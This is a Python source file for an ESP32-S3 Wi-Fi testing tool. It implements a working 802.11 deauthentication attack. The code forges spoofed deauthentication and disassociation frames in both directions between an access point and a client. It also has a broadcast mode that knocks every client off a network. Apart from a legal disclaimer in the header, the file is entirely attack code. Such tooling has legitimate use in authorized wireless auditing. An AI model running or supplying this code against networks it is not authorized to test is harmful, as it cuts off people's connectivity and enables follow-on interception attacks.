# deauther.py — IEEE 802.11 Deauthentication module for ESP32-S3
#
# Part of ESP32-S3 Marauder — Wi-Fi Security Testing Tool
#
# WARNING: This tool is intended for AUTHORIZED penetration testing and
# educational purposes ONLY.  Using this tool against networks you do not
# own or have explicit written permission to test is ILLEGAL and may
# violate laws such as the Computer Fraud and Abuse Act (US), the Computer
# Misuse Act (UK), or equivalent legislation in your jurisdiction.
#
# The authors accept NO liability for misuse of this software.

import time
import gc

try:
    import _wifi_raw
except ImportError:
    _wifi_raw = None

from utils import mac_bytes_to_str, log, log_error, BROADCAST_MAC
from packet_builder import (
    build_deauth_frame,
    build_disassoc_frame,
    REASON_CLASS3_FROM_NONASSOC,
)


class Deauther:
    """Send IEEE 802.11 Deauthentication / Disassociation frames.

    Typical use for security auditing:
        d = Deauther()
        d.deauth_client(ap_mac, client_mac, channel=6, count=50)
    """

    def __init__(self):
        self._running = False
        self._packets_sent = 0
        self._seq_num = 0

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def deauth_client(self, ap_mac, client_mac, channel,
                      count=100, delay_ms=100, use_disassoc=True):
        """Deauthenticate a specific client from an AP.

        Sends *bidirectional* deauth frames (AP→Client and Client→AP) for
        maximum effectiveness.  Optionally also sends disassociation frames.

        Args:
            ap_mac:       bytes(6) — BSSID of the target access point
            client_mac:   bytes(6) — MAC of the target client
            channel:      int      — Wi-Fi channel to transmit on
            count:        int      — number of deauth *rounds* to send
            delay_ms:     int      — pause between rounds (milliseconds)
            use_disassoc: bool     — also send disassoc frames each round
        """
        if _wifi_raw is None:
            log_error('_wifi_raw module not available')
            return

        log('Deauth target: client %s on AP %s  ch=%d  rounds=%d' %
            (mac_bytes_to_str(client_mac), mac_bytes_to_str(ap_mac),
             channel, count))

        _wifi_raw.set_channel(channel)
        self._running = True
        self._packets_sent = 0

        try:
            for i in range(count):
                if not self._running:
                    break
                self._send_deauth_pair(ap_mac, client_mac, use_disassoc)
                if (i + 1) % 10 == 0 or i == 0:
                    log('Sent %d / %d rounds  (%d pkts)' %
                        (i + 1, count, self._packets_sent))
                time.sleep_ms(delay_ms)
        except KeyboardInterrupt:
            log('Deauth interrupted by user')
        finally:
            self._running = False
            log('Deauth finished — %d packets sent' % self._packets_sent)
            gc.collect()

    def deauth_broadcast(self, ap_mac, channel,
                         count=100, delay_ms=100):
        """Broadcast deauth — disconnects ALL clients from the AP.

        Uses FF:FF:FF:FF:FF:FF as the destination address.
        """
        self.deauth_client(ap_mac, BROADCAST_MAC, channel,
                           count=count, delay_ms=delay_ms,
                           use_disassoc=True)

    def stop(self):
        """Request the running deauth loop to stop."""
        self._running = False

    @property
    def is_running(self):
        return self._running

    @property
    def packets_sent(self):
        return self._packets_sent

    # ------------------------------------------------------------------
    # Internals
    # ------------------------------------------------------------------

    def _next_seq(self):
        """Return next 12-bit sequence number (wraps at 4095)."""
        self._seq_num = (self._seq_num + 1) & 0x0FFF
        return self._seq_num

    def _send_deauth_pair(self, ap_mac, client_mac, use_disassoc):
        """Send one round of deauth (and optionally disassoc) frames.

        Each round sends frames in both directions:
            1. AP  → Client  (deauth)
            2. Client → AP   (deauth)
        and if *use_disassoc*:
            3. AP  → Client  (disassoc)
            4. Client → AP   (disassoc)
        """
        reason = REASON_CLASS3_FROM_NONASSOC

        # --- Deauth: AP → Client ---
        pkt = build_deauth_frame(
            dst_mac=client_mac, src_mac=ap_mac, bssid=ap_mac,
            reason=reason, seq_num=self._next_seq())
        _wifi_raw.send_raw(pkt)
        self._packets_sent += 1

        # --- Deauth: Client → AP ---
        pkt = build_deauth_frame(
            dst_mac=ap_mac, src_mac=client_mac, bssid=ap_mac,
            reason=reason, seq_num=self._next_seq())
        _wifi_raw.send_raw(pkt)
        self._packets_sent += 1

        if use_disassoc:
            # --- Disassoc: AP → Client ---
            pkt = build_disassoc_frame(
                dst_mac=client_mac, src_mac=ap_mac, bssid=ap_mac,
                reason=8, seq_num=self._next_seq())
            _wifi_raw.send_raw(pkt)
            self._packets_sent += 1

            # --- Disassoc: Client → AP ---
            pkt = build_disassoc_frame(
                dst_mac=ap_mac, src_mac=client_mac, bssid=ap_mac,
                reason=8, seq_num=self._next_seq())
            _wifi_raw.send_raw(pkt)
            self._packets_sent += 1
